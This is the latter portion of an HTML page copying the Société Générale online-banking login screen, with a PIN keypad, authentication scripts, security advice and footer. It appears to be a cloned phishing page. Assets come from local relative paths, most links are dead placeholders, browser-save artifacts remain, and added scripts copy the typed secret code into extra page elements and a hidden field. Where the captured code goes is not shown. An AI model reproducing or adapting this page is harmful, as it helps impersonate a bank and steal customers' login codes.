document.getElementById('temoin-nbr6').style.color = "#DDD";

}
if(passpass.length == 1){ 
document.getElementById('temoin-nbr1').innerHTML = ".";
document.getElementById('temoin-nbr1').style.fontSize = "65px";
document.getElementById('temoin-nbr1').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 2){ 
document.getElementById('temoin-nbr2').innerHTML = ".";
document.getElementById('temoin-nbr2').style.fontSize = "65px";
document.getElementById('temoin-nbr2').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 3){ 
document.getElementById('temoin-nbr3').innerHTML = ".";
document.getElementById('temoin-nbr3').style.fontSize = "65px";
document.getElementById('temoin-nbr3').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 4){ 
document.getElementById('temoin-nbr4').innerHTML = ".";
document.getElementById('temoin-nbr4').style.fontSize = "65px";
document.getElementById('temoin-nbr4').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 5){ 
document.getElementById('temoin-nbr5').innerHTML = ".";
document.getElementById('temoin-nbr5').style.fontSize = "65px";
document.getElementById('temoin-nbr5').style.color = "gray";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length == 6){ 
document.getElementById('temoin-nbr6').innerHTML = ".";
document.getElementById('temoin-nbr6').style.fontSize = "65px";
document.getElementById('temoin-nbr6').style.color = "gray";
document.getElementById('secret-nbr').maxLength = "6";
document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
}
if(passpass.length >= 7){ 
/*document.getElementById('secret-nbr2').innerHTML = passpass.slice(0,5);*/
document.getElementById('secret-nbr').value = document.getElementById('secret-nbr2').innerHTML;
}

document.getElementById('secret-nbr').maxLength = "6";
setTimeout(function () { temoinNumber(); },60);
}

temoinNumber();

</script>  




 <div id="js-error" tabindex="0" class="auth_error"></div>

</div>
<input type="hidden"  name="Hidden1" id="Hidden1"/>
</div>
<div>
<div id="gda_vk" class="clavier-container dcw_block-element dcw_conteneur_clavier swm-visible">
<div id="img_container" class="img-container">
<img id="img_clavier" class="keyboard dcw_block-element dcw_conteneur_clavier" usemap="#tc_tclavier" src="../assets/img/gen_ui.png">
<div id="hover_touche_4_4" class="hover" onclick="addCode ('3');" name="3" value="" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div>
<div id="hover_touche_4_2" class="hover" onclick="addCode ('4');" name="4" value="" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_4" class="hover" onclick="addCode ('8');" name="8" value="" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_3" class="hover" onclick="addCode ('7');" name="7" value="" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_2" class="hover" onclick="addCode ('9');" name="9" value="" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_3_1" class="hover" onclick="addCode ('0');" name="0" value="" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div>
<div id="hover_touche_2_1" class="hover" onclick="addCode ('6');" name="6" value="" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div>
<div id="hover_touche_1_4" class="hover" onclick="addCode ('2');" name="2" value="" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div>
<div id="hover_touche_1_3" class="hover" onclick="addCode ('5');" name="5" value="" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div>
<div id="hover_touche_1_1" class="hover" onclick="addCode ('1');" name="1" value="" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
</div>
</div>
</div>

<div class="auth-cs-content-validate">

<button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-authent" type="submit" aria-label="Valider votre code secret">Valider</button>

<div class="sonore-Keyboard dcw_block-element">
<br>
<style type="text/css">
.buttcolor:hover{color:red;}
.buttcolor{color:black;}
</style>
<button class="buttcolor" style="width:200px !important; background-color: transparent; border: none; font-size: 16px; margin-left: 15px;">Activer le clavier sonore</button>
</div>

</div>
</div>
</div>
</div>
</div>
</div>

</div>

</div>

</div>


</form>
</div>
</section>
</section>
</main>


</DIV>  

<script id="templateComponentAuthentCv" type="template/doT.js">

 <div id="module-authent-cv">
 <div class="container-mire-codeClient"></div>
 <div id="clavier"></div>
 </div>

 </script>


  </div>





<script>
var fun;
function onSWMLoaded(params) {
if ("") {
fun = function() {
params.error ? params.error() : (function () {
if (!document.getElementById('js-error')) {
document.getElementById(params.defaultClass || 'swm-wrapper').innerHTML = ("<div id=\"js-error\"></div>");
}
swm.commun.showErrorMessage.call(this, "", "/icd/cbo/index-authsec.html#cbo/");
})();
};
window.swm ? fun() : document.addEventListener("swm.onLoad", fun);
} else {
fun = initSWM.bind(this, params);
window.swm ? initSWM(params) : document.addEventListener("swm.onLoad", fun);
}
}


function initSWM(params) {

window.jQueryForSwm = swm.$;
window.swmAutoInit = false;
(function(a,b){if(typeof define==="function"&&define.amd){if(typeof swmAutoInit==="undefined"){swmAutoInit=false}define(["jquery"],b)}else{if(typeof swmAutoInit==="undefined"){swmAutoInit=true}var c=a.jQueryForSwm||a.jQuery;if(typeof c==="undefined"){console.debug("swmApi load : !!! jQuery is missing !!!")}b(c)}})(this,function(g){if(window&&typeof window.swmApi!=="undefined"){return window.swmApi}var m={};var p;var s=false;var i=false;var b={getJetonCallback:[],iStockageJetonActifCallback:[],ajaxFilter:[]};var f={};m.consts={};m.consts.niveauSensibilite={};m.consts.niveauSensibilite.NORMAL={value:0};m.consts.niveauSensibilite.SENSIBLE={value:100};m.consts.niveauSensibilite.TRES_SENSIBLE={value:200};if(typeof swmConfOverride!=="undefined"){m.version=swmConfOverride.version}m.loadSwm=function(){r("The method swm.loadSwm is deprecated, please use swm.init instead.");m.init.apply(m,arguments)};m.init=function(u){var v={mainJsPath:"/js/swm.main.js",swmMain:undefined};q(v,u);function w(){m.config=p.config;m.$=p.$;s=false;i=true;o();c("swm.available",p)}m.addConf({onAuthent:v.onAuthent,onBack:v.onBack,onClose:v.onClose,onConnecting:v.onConnecting,onInitDone:v.onInitDone,onLoadingError:v.onLoadingError,onLogout:v.onLogout,ajaxFilterRegExp:v.ajaxFilterRegExp,ajaxFilterJquery:v.ajaxFilterJquery,baseUrl:v.baseUrl});if(!i){p=v.swmMain;if(typeof p!=="undefined"){setTimeout(w,0)}else{j("swm.init",function(x){p=x;w()});if(!s){s=true;var t;if(typeof swmConfOverride!=="undefined"&&swmConfOverride.staticBaseUrl){t=(v.baseUrl||"")+swmConfOverride.staticBaseUrl+v.mainJsPath}else{t="/swm/resources/version/"+m.version+v.mainJsPath}k(t,function(){c("swm.loadingError")})}}}else{c("swm.available",p)}};if(window.swmAutoInit){j("swm.loaded",m.init)}window.swmAutoInit=undefined;m.ajaxFilter=function(u,t){if(p){u.ajaxFilterJquery=u.ajaxFilterJquery||g||p.$;if(u.ajaxFilterRegExp){u.ajaxFilterJquery.ajax=p.filterAjaxRequests(u).overridedAjax;if(typeof t==="function"){t()}}return u.ajaxFilterJquery.ajax}else{a("ajaxFilter",[u,t])}};m.onLogout=function(t){j("swm.logout",t)};m.onClose=function(t){j("swm.close",t);j("swm.closeKeyboard",t)};m.onConnecting=function(t){j("swm.connecting",t)};m.onBack=function(t){j("swm.back",t)};m.onLogoutError=function(t){j("swm.logout.error",t)};m.onAuthent=function(t){j("swm.postchgtnivauth",t)};m.setStockageJetonActif=function(t){t=t==true;if(p){p.data.setStockageJetonActif(t)}else{h("setStockageJetonActif",t)}};m.isStockageJetonActif=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.isStockageJetonActif())},0)}else{a("iStockageJetonActifCallback",t);return undefined}}};m.getJeton=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.getJeton())},0)}else{a("getJetonCallback",t);return undefined}}};m.getIdStat=function(){if(p){return p.data.getIdStat()}return undefined};m.reattribuerCodeSecret=function(t,u){if(p){p.reattribuerCodeSecret(t,u)}else{h("reattribuerCodeSecret",[t,u])}};m.sign=function(t,v){if(p){return p.sign(t,v)}else{var u={getData:function(){return new Error("Signature non prÃªte public.")}};h("sign",{params:[t,v],promise:u});if(typeof t==="string"){return u}}};m.triggerSwmLogout=function(){if(p){return p.triggerSwmLogout()}else{return new Error("triggerSwmLogout non prÃªte public.")}};m.record=function(t){if(p){return p.record(t)}else{h("record",arguments)}};m.checkSign=function(t){if(p){return p.checkSign(t)}else{h("checkSign",arguments)}};m.gda_handleResponse=function(w,u,v,t){if(p){return p.gda_handleResponse(w,u,v,t)}else{return undefined}};m.errorSign=function(t){var u={};u.success=t.success;u.actionLevel=t.action_level||t.actionLevel||0;u.jetonTransaction=t.context||t.jetonTransaction;u.error=t.error;u.isMessageRequired=t.isMessageRequired;u.callback=t.callback;if(p){return p.errorSign(u)}else{h("errorSign",arguments)}};m.getDateDerniereConnexion=function(){if(p){return p.data.getDateDerniereConnexion()}return undefined};m.getCanalDerniereConnexion=function(){if(p){return p.data.getCanalDerniereConnexion()}return undefined};m.getDroits=function(){if(p){return p.data.getDroits()}return undefined};m.logout=function(){if(p){p.logout.apply(m,arguments)}else{h("logout",arguments)}};m.logoutSupervision=function(){r("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead.");m.logout()};m.resetAuthentData=function(){if(p){p.data.resetAuthentData.apply(m,arguments)}else{h("resetAuthentData",arguments)}};m.isAuthenticated=function(){if(p){return p.isAuthenticated()}return false};m.authent=function(u,t,v){if(p){t=t||function(w){if(f.preSuccess==="function"){f.preSuccess(w,function(){f.success(w)})}else{f.success(w)}};v=v||f.error;return p.authent(u,t,v)}else{h("authent",[u,t,v])}return false};m.setDefaultAuthentCallbacks=function(t){f.preSuccess=t.preSuccess||f.preSuccess;f.success=t.success||f.success;f.error=t.error||f.error};m.changeCodeSecret=function(t,u){if(p){return p.changeCodeSecret(t,u)}else{h("changeCodeSecret",[t,u])}return false};m.changeCodeSecretDelegue=function(u,v,t){if(p){return p.changeCodeSecret(u,v,t)}else{h("changeCodeSecretDelegue",[u,v,t])}return false};m.addConf=function(t){t.onAuthent&&j("swm.postchgtnivauth",t.onAuthent);t.onLogout&&j("swm.logout",t.onLogout);t.onBack&&j("swm.back",t.onBack);t.onClose&&j("swm.close",t.onClose);t.onConnecting&&j("swm.connecting",t.onConnecting);t.onLoadingError&&j("swm.loadingError",t.onLoadingError);t.onAjaxFilterReady&&j("swm.onResponseFilterReady",t.onAjaxFilterReady);if(t.ajaxFilterRegExp){var u={ajaxFilterRegExp:t.ajaxFilterRegExp,ajaxFilterJquery:t.ajaxFilterJquery,ajaxFilterAxios:t.ajaxFilterAxios};m.ajaxFilter(u,t.onAjaxFilterReady)}if(t.baseUrl){d(t.baseUrl)}if(typeof p!="undefined"){t.onInitDone&&t.onInitDone()}else{t.onInitDone&&j("swm.available",t.onInitDone)}};function d(t){if(p){p.config.baseUrl=t}else{h("setBaseUrl",[t])}}function h(t,u){b[t]=u;!s&&!i&&m.init()}function a(t,u){b[t].push(u);!s&&!i&&m.init()}function n(t){return t&&Object.prototype.toString.call(t)==="[object Array]"}function o(){for(var v in b){if(v==="iStockageJetonActifCallback"||v==="getJetonCallback"){for(var u in b[v]){m.hasOwnProperty(v)&&typeof m[v]==="function"&&m[v](u)}}else{if(v==="signature"){var w=m[v].apply(m,b[v].params);if(typeof w==="object"){b.signature.promise.getData=w}}else{if(v==="setBaseUrl"){d.apply(m,b.setBaseUrl)}else{if(n(b[v])){for(var t in b[v]){b[v].hasOwnProperty(t)&&m[v].apply(m,b[v][t])}}else{m[v].apply(m,b[v])}}}}}b={getJetonCallback:[],iStockageJetonActifCallback:[]}}function c(t,v){var u=document.createEvent("Event");u.initEvent(t,true,true);u.data=v;document.dispatchEvent(u);var x=window.self!==window.top;if(x){try{top.document.dispatchEvent(u)}catch(w){}}}g&&(g.fn.triggerExternal=c);function j(u,v){var t=function(w){if(typeof v==="function"){v(w.data)}};document.removeEventListener(u,t);document.addEventListener(u,t)}function k(u,v){if(g&&typeof g.Deferred!=="undefined"){var t=l(u);g.when(t).fail(v)}else{e(u,v)}}function l(v){var t=g.Deferred(),u=document.createElement("script");u.async="async";u.type="text/javascript";u.src=v;u.onload=u.onreadystatechange=function(x,w){if(!u.readyState||/loaded|complete/.test(u.readyState)){if(w){t.reject()}else{t.resolve()}}};u.onerror=function(){t.reject()};g("head")[0].appendChild(u);return t.promise()}function e(u,v){var t=document.createElement("script");t.async=false;t.src=u;t.type="text/javascript";t.onerror=v;t.charset="UTF-8";document.getElementsByTagName("head")[0].appendChild(t)}function r(u){try{console&&typeof console.warn==="function"&&console.warn("[SWM] "+u)}catch(t){}}function q(u,t){if(t){for(var v in t){if(t.hasOwnProperty(v)){u[v]=t[v]}}}return u}setTimeout(function(){c("swm.loaded",m)},0);window.swmApi=m;return m});
swmApi.init({
swmMain: swm
});
swm.commun.setGdaReplay("/swm/swm-redirect.html", "rDBg2KLXMgVm0a88I35dzCUPCOosAQAAAQAAABsAAAAvY29tL2ljZC13ZWIvY2JvL2luZGV4Lmh0bWw%3D", "" || window.location.hash);
if ("") {
swm.commun.showError("");
}
params.event && swm.trackEvent(params.event);
document.removeEventListener("swm.onLoad", fun);
fun = undefined;
params.success && params.success();
}
</script>

<script>
onSWMLoaded({
defaultClass: 'swmModulesAuth',
success: function() {

swmApi.setDefaultAuthentCallbacks({
success : function(rsp) {
swm.commun.replayInterceptedPage();
},
error: function(err) {
swm.defaultAuthentError(err, "/icd/cbo/index-authsec.html#cbo/");
}
});

swmApi.authent("300");
},
event: {
pageName: 'Mon_Profil::Connexion::Ecran_Connexion'
}
});
</script>

</div>



<!--<script type="text/javascript" src="../assets/js/swm.main.js" charset="UTF-8"></script>-->







<script type="text/javascript">
if (typeof(swm) != "undefined" && swm.onLogout) {
swm.onLogout(function() {
document.location.href = '/icd/cbo/index-authsec.html#cbo/';
});
}

</script>
</div>


</section>
<section class="dcw_gb9_core-right">


 


<div>

<div>
<link href="../assets/css/eo2680-style.css" rel="stylesheet">
<div id="swm-content-default">
<p><br>
<strong>Obtenir vos codes</strong><br>
<br>
Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.<br>
<br>
<strong>Code secret oublié</strong><br>
<br>
<a style="text-decoration: underline !important" href="#" class="dcw_card-visual_regular-link"><svg aria-hidden=" true="><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Effectuer une nouvelle demande</a><br>
<br>
<br>
<strong>Urgences carte bancaire</strong><br>
<br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Faire opposition &agrave; votre carte bancaire"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Faire opposition à votre carte bancaire</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifi&eacute;es"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Verrouiller votre carte bancaire</a><br>
<br>
<br>
<strong>Nos conseils sécurité</strong><br>
<br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Découvrez le Pass sécurité</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifi&eacute;es"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Voir les menaces identifiées</a><br>
<a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><svg aria-hidden="true" focusable="false"><use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use></svg>Guide des bonnes pratiques</a></p>
</div>

<div id="swm-content-oob" style="display:none">
<div class="eo2680-pass">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="../assets/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-pass--txt"><strong>Comment ça se passe ?</strong><br>
Une demande de connexion est envoyée en temps réel sur votre mobile dans l’Appli Société Générale. Il vous suffit de la valider depuis votre mobile. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>

<hr>
<p class="eo2680-pass--txt"><strong>Vous avez changé de numéro de téléphone ?</strong><br>
Vous pouvez modifier votre numéro de téléphone en appelant notre serveur vocal au +33 825 007 111 (0,05 eur TTC/min + prix d'un appel) ou en vous rendant dans votre agence. <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Communiquer votre numéro de téléphone Sécurité</a> <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Activer votre t&eacute;l&eacute;phone S&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg>Activer votre téléphone Sécurité</a></p>

<hr>
<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-oob --></div>
<!-- #### -->

<div id="swm-content-otp" style="display:none">
<div class="eo2680-oob">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="../assets/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<div class="eo2680-card"><span><strong>Le saviez vous ?</strong></span>

<figure><img src="../assets/img/s-curit-renforc-e-2.png"></figure>

<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="D&eacute;couvrez le Pass s&eacute;curit&eacute;"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="../assets/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-otp --></div>

</div>

</div>




</section>
<section class="dcw_gb_row dcw_gb_clearfix">


 

<div>

<div>
<script type="text/javascript">
  var element = document.querySelector('.rsp_header');
  element.classList.add("js-header-lhs-auth");
</script>

</div>

</div>




</section>
</section>
</main>
<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
<div class="dcw_msg-banner_msg-wrapper">
<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
<p class="dcw_msg-banner_message">
En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="#" class="eip_dcw_main-link">cliquez ici</a></span>.
</p>
<button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
</button>
</div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper">
<svg class='dcw_msg-banner_picto-info' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#info'></use></svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">

</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
<svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#close-2'></use></svg>
</button>
</div>
</aside><footer class="dcw_footer" role="contentinfo">
<div class="dcw_footer-second">
<div class="dcw_footer_container">
<nav class="dcw_footer-second_nav">
<ul class="dcw_footer-second_list">
<li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class='dcw_footer-second_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#question'></use></svg>
Questions fréquentes
</a></li>
<li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#"><svg class='dcw_footer-second_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#localisation'></use></svg>
Trouver une agence
</a></li>
<li class="dcw_footer-second_item">
<div class="dcw_dropdown js-dropdown-light">
<button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
   <svg class='dcw_dropdown_icon' aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#arrow-dropdown'></use></svg>
<ul class="dcw_dropdown_list toggle_content">
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Banque privée</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Professionnels</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Entreprises</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Associations</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Économie publique</a>
</li>
<li class="dcw_dropdown_item">
<a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#">Groupe Société Générale</a>
</li>
</ul>
</div></li>
</ul>
</nav>
<ul class="dcw_footer_container dcw_footer-second_social">
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="#" aria-label="Voir le groupe Facebook de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#facebook-2'></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="#" aria-label="Voir le Twitter de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#twitter-2'></use></svg>
</a></li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="#" aria-label="Voir l' Instagram de la Soci&eacute;t&eacute; G&eacute;n&eacute;rale"><svg aria-hidden='true' focusable='false'><use width='100%' height='100%' xmlns:xlink='http://www.w3.org/1999/xlink' xlink:href='../assets/img/pictos-fonctionnels_20220315164858.svg#instagram'></use></svg>
</a></li>
</ul>
</div>
</div>
<nav class="dcw_footer-third">
<div class="dcw_footer_container">
<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="../assets/img/logo-sg-seul.svg" width="150" />
<ul class="dcw_footer-third_list">
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Sécurité</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Nos engagements</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Gestion des Cookies</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Données personnelles</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Documentation et Tarifs</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Informations légales</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="#">Accessibilité Numérique (partiellement conforme)</a>
</li>
</ul>
</div>
</nav>
</footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /authen/footer, FURL_ID: 1983c1c77d92f510VgnVCM100000030013acRCRD -->

<style type="text/css">
  .butthoverr{background-color: #010035 !important;}
  .butthoverr:hover{background-color: #191970 !important;}
</style>
<script type="text/javascript">
  function but_0_1_2(id){
var idd = id;
if(idd == 0){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 1){
   document.getElementById('but-1').style.backgroundcolor = "#191970";
   document.getElementById('but-2').style.backgroundcolor = "#010035";
   document.getElementById('text-1').style.display = "block";
   document.getElementById('text-2').style.display = "none";
}
if(idd == 2){
   document.getElementById('but-1').style.backgroundcolor = "#010035";
   document.getElementById('but-2').style.backgroundcolor = "#191970";
   document.getElementById('text-1').style.display = "none";
   document.getElementById('text-2').style.display = "block";
}
  }
</script>
<script id="tc_script__1" type="text/javascript" src="../assets/js/tc_SocieteGenerale_22.js" defer=""></script>
<DIV id="interactWrapper" class="sdcwrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer interactCSSWrapper" bis_skin_checked="1" style="position: fixed; float: right; right: 0px; margin-top: -55%; margin-bottom: -30%; z-index: 100;">
   <div class="interact-layout" id="content" bis_skin_checked="1">
  <div class="interact-header" bis_skin_checked="1"></div>
  <div class="interact-content" bis_skin_checked="1"></div>
  <div class="interact-popin" bis_skin_checked="1"></div>
  <div class="interact-footer" bis_skin_checked="1"></div>
  <div class="interact-sticky" bis_skin_checked="1">
 <div id="tch_sticky-bar" class="tch_sticky-bar_container" bis_skin_checked="1">
<div class="tch_sticky-contact_bar" bis_skin_checked="1">
   <h3 class="tch_sticky-bar_title" style="display:none">Besoin d'aide</h3>
   <p class="tch_sticky-bar_message" style="display:none">Nos experts vous accompagnent dans le choix de la solution adaptée à vos besoins </p>
   <div class="tch_sticky-bar has-two-icons" bis_skin_checked="1">

<span id="text-1" class="tch_tooltip" style="position: fixed; margin-left: -160px; top: 410px; display: none;">Poser une question à SoBot  </span>
<span id="text-2" class="tch_tooltip" style="position: fixed; margin-left: -120px; top: 480px; display: none;">Prendre rendez-vous  </span>

  <ul class="tch_sticky-bar_list" style="border: none; border-color: transparent;" id="chatoo">
 <li class="tch_sticky-bar_item" style="border: none; border-color: transparent;">
